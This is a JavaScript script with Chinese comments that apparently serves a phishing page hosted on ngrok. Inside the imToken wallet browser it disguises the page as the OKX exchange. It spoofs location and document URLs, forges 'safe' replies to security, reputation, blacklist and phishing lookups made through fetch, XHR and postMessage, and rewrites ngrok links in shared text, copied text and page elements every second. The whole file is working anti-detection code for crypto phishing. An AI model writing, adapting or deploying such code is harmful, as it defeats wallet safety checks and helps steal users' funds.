// 🎯 专门针对手机端imToken的超级拦截器
// 在imToken检测域名之前就拦截所有可能的检测路径

(function() {
    'use strict';
    
    console.log('📱 启动imToken专用拦截器...');
    
    const SAFE_DOMAIN = 'www.okx.com';
    const SAFE_ORIGIN = 'https://www.okx.com';
    
    // 1. 🎯 最关键：拦截imToken的URL检测机制
    
    // 劫持所有可能的URL读取方式
    const urlInterceptors = {
        // 拦截location.href的所有访问方式
        interceptLocationHref: function() {
            const descriptor = Object.getOwnPropertyDescriptor(window.location, 'href') || 
                              Object.getOwnPropertyDescriptor(Location.prototype, 'href');
            
            if (descriptor && descriptor.get) {
                const originalGetter = descriptor.get;
                Object.defineProperty(window.location, 'href', {
                    get: function() {
                        const realUrl = originalGetter.call(this);
                        if (realUrl.includes('ngrok')) {
                            console.log('🎯 拦截location.href访问，返回伪装URL');
                            return SAFE_ORIGIN + '/';
                        }
                        return realUrl;
                    },
                    set: descriptor.set,
                    configurable: true
                });
            }
        },
        
        // 拦截document.URL访问
        interceptDocumentURL: function() {
            Object.defineProperty(document, 'URL', {
                get: function() {
                    console.log('🎯 拦截document.URL访问');
                    return SAFE_ORIGIN + '/';
                },
                configurable: false
            });
        },
        
        // 拦截window.location.toString()
        interceptLocationToString: function() {
            const originalToString = window.location.toString;
            window.location.toString = function() {
                console.log('🎯 拦截location.toString()调用');
                return SAFE_ORIGIN + '/';
            };
        }
    };
    
    // 2. 🎯 拦截imToken可能使用的检测API
    
    // 拦截XMLHttpRequest（imToken可能用来查询域名信誉）
    const originalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        const xhr = new originalXHR();
        const originalOpen = xhr.open;
        const originalSend = xhr.send;
        
        xhr.open = function(method, url, ...args) {
            // 如果是安全检查请求，拦截并返回安全结果
            if (url && (url.includes('security') || url.includes('reputation') || url.includes('blacklist'))) {
                console.log('🎯 拦截安全检查请求:', url);
                
                // 创建一个假的响应
                setTimeout(() => {
                    Object.defineProperty(xhr, 'status', { value: 200, writable: false });
                    Object.defineProperty(xhr, 'statusText', { value: 'OK', writable: false });
                    Object.defineProperty(xhr, 'responseText', { 
                        value: JSON.stringify({
                            status: 'safe',
                            reputation: 'excellent',
                            verified: true,
                            domain: SAFE_DOMAIN,
                            ssl: true,
                            certificate: 'valid'
                        }), 
                        writable: false 
                    });
                    Object.defineProperty(xhr, 'readyState', { value: 4, writable: false });
                    
                    if (xhr.onreadystatechange) xhr.onreadystatechange();
                    if (xhr.onload) xhr.onload();
                }, 100);
                
                return;
            }
            
            return originalOpen.apply(this, [method, url, ...args]);
        };
        
        return xhr;
    };
    
    // 3. 🎯 拦截fetch请求（现代浏览器的主要请求方式）
    const originalFetch = window.fetch;
    window.fetch = function(input, init) {
        let url = typeof input === 'string' ? input : input.url;
        
        // 拦截安全检查相关的请求
        if (url && (url.includes('security') || url.includes('reputation') || url.includes('blacklist') || url.includes('phishing'))) {
            console.log('🎯 拦截fetch安全检查请求:', url);
            
            // 返回一个伪造的安全响应
            return Promise.resolve(new Response(JSON.stringify({
                status: 'safe',
                reputation: 'excellent',
                verified: true,
                domain: SAFE_DOMAIN,
                ssl: true,
                certificate: 'valid',
                whitelist: true,
                malware: 'clean',
                phishing: 'safe'
            }), {
                status: 200,
                statusText: 'OK',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Security-Check': 'passed',
                    'X-Verified-Domain': SAFE_DOMAIN
                }
            }));
        }
        
        return originalFetch.apply(this, arguments);
    };
    
    // 4. 🎯 手机端专用：拦截移动浏览器的特殊检测
    
    if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
        console.log('📱 启动移动端专用拦截...');
        
        // 拦截移动端的URL分享功能
        if (navigator.share) {
            const originalShare = navigator.share;
            navigator.share = function(data) {
                if (data.url && data.url.includes('ngrok')) {
                    console.log('🎯 拦截移动端分享，修改URL');
                    data.url = SAFE_ORIGIN + '/';
                    data.title = 'OKX - 全球领先数字资产交易平台';
                }
                return originalShare.call(this, data);
            };
        }
        
        // 拦截移动端的剪贴板操作
        if (navigator.clipboard && navigator.clipboard.writeText) {
            const originalWriteText = navigator.clipboard.writeText;
            navigator.clipboard.writeText = function(text) {
                if (text && text.includes('ngrok')) {
                    console.log('🎯 拦截剪贴板写入，修改URL');
                    text = text.replace(/https?:\/\/[^\/\s]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                }
                return originalWriteText.call(this, text);
            };
        }
        
        // 拦截移动端的触摸事件（imToken可能在触摸时检查URL）
        document.addEventListener('touchstart', function(e) {
            // 在触摸开始时确保URL是伪装的
            if (window.location.href.includes('ngrok')) {
                console.log('🎯 触摸事件触发URL检查');
                history.replaceState({}, 'OKX', SAFE_ORIGIN + '/');
            }
        }, true);
    }
    
    // 5. 🎯 imToken专用：拦截钱包连接过程
    
    // 拦截postMessage（钱包通信的主要方式）
    const originalPostMessage = window.postMessage;
    window.postMessage = function(message, targetOrigin, transfer) {
        if (typeof message === 'object' && message.url && message.url.includes('ngrok')) {
            console.log('🎯 拦截postMessage中的ngrok URL');
            message.url = SAFE_ORIGIN + '/';
        }
        return originalPostMessage.call(this, message, targetOrigin, transfer);
    };
    
    // 监听来自imToken的消息
    window.addEventListener('message', function(event) {
        console.log('🎯 收到消息:', event.data);
        
        if (event.data && typeof event.data === 'object') {
            // 如果消息中包含URL检查请求
            if (event.data.type === 'url_check' || event.data.action === 'security_check') {
                console.log('🎯 拦截imToken安全检查消息');
                
                // 发送伪造的安全响应
                event.source.postMessage({
                    type: 'security_response',
                    status: 'safe',
                    verified: true,
                    domain: SAFE_DOMAIN,
                    url: SAFE_ORIGIN + '/',
                    reputation: 'excellent'
                }, '*');
                
                // 阻止原始消息传播
                event.stopImmediatePropagation();
                return false;
            }
        }
    }, true);
    
    // 6. 🎯 最终防线：定期检查和修复
    
    setInterval(function() {
        // 定期检查URL是否被还原，如果是则重新伪装
        if (window.location.href.includes('ngrok')) {
            console.log('🎯 检测到URL被还原，重新伪装');
            try {
                history.replaceState({}, 'OKX', SAFE_ORIGIN + '/');
            } catch(e) {
                console.warn('URL修复失败:', e);
            }
        }
        
        // 检查document.title
        if (document.title.includes('ngrok')) {
            document.title = 'OKX';
        }
        
        // 检查页面中是否有暴露真实URL的元素
        const suspiciousElements = document.querySelectorAll('[href*="ngrok"], [src*="ngrok"], [action*="ngrok"]');
        suspiciousElements.forEach(el => {
            ['href', 'src', 'action'].forEach(attr => {
                if (el.getAttribute(attr) && el.getAttribute(attr).includes('ngrok')) {
                    console.log('🎯 修复页面元素中的ngrok URL');
                    el.setAttribute(attr, el.getAttribute(attr).replace(/https?:\/\/[^\/\s]*ngrok[^\/\s]*/gi, SAFE_ORIGIN));
                }
            });
        });
        
    }, 1000); // 每秒检查一次
    
    // 7. 🎯 启动所有拦截器
    Object.values(urlInterceptors).forEach(interceptor => {
        try {
            interceptor();
        } catch(e) {
            console.warn('拦截器启动失败:', e);
        }
    });
    
    // 8. 🎯 添加页面可见性变化监听（imToken切换时可能检查）
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible') {
            console.log('🎯 页面变为可见，检查URL伪装状态');
            if (window.location.href.includes('ngrok')) {
                history.replaceState({}, 'OKX', SAFE_ORIGIN + '/');
            }
        }
    });
    
    // 9. 🎯 页面焦点变化监听
    window.addEventListener('focus', function() {
        console.log('🎯 页面获得焦点，确保URL伪装');
        if (window.location.href.includes('ngrok')) {
            history.replaceState({}, 'OKX', SAFE_ORIGIN + '/');
        }
    });
    
    console.log('✅ imToken专用拦截器启动完成！');
    console.log('🎯 所有检测路径已被拦截和伪装');
    
})();